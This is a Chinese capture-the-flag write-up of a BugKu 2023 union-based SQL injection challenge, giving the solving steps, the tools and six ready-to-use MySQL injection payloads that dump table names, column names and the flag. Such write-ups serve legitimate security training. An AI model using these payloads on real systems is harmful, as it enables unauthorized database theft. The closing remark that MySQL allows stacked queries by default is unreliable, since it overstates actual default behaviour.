# 基础联合查询注入

## 来源
CTF比赛: BugKu
年份: 2023

## 类型
SQL Injection - Union Based

## 题目分析
一个简单的 SQL 注入漏洞，参数未经过滤直接拼接进 SQL 查询。
页面返回正常/异常两种状态，支持 UNION 联合查询。

## 解题思路
1. 判断注入点：输入单引号 `'` 触发数据库错误
2. 确认注入类型：使用 `and 1=1` / `and 1=2` 判断为字符型注入
3. 确定字段数：使用 `order by N` 逐次尝试，直到页面异常
4. 确定显示位：使用 `union select 1,2,3,...` 确定回显位置
5. 获取数据库信息：在显示位填入 `database()`, `version()`, `user()`
6. 获取表名：查询 `information_schema.tables`
7. 获取列名：查询 `information_schema.columns`
8. 脱库：查询目标表获取 flag

## 使用工具
- sqlmap（自动检测）
- Burp Suite Repeater（手动测试）
- Python requests（脚本化）

## Payload
判断字段数：
```
id=1' order by 3--+
```

确定显示位：
```
id=-1' union select 1,2,3--+
```

获取数据库名：
```
id=-1' union select 1,database(),3--+
```

获取表名：
```
id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+
```

获取列名：
```
id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='flag'--+
```

获取数据：
```
id=-1' union select 1,flag,3 from flag--+
```

## Flag获取方式
通过联合查询直接从数据库中提取 flag 字段内容。

## 技术总结
关键词：union注入, 联合查询, information_schema, 字符型注入, order by

核心要点：
1. 使用 `order by` 确定字段数
2. 使用 `-1` 让前查询结果为空，使联合查询结果回显
3. 使用 `group_concat()` 一次性获取多行数据
4. MySQL 默认支持堆叠查询，但联合查询更通用
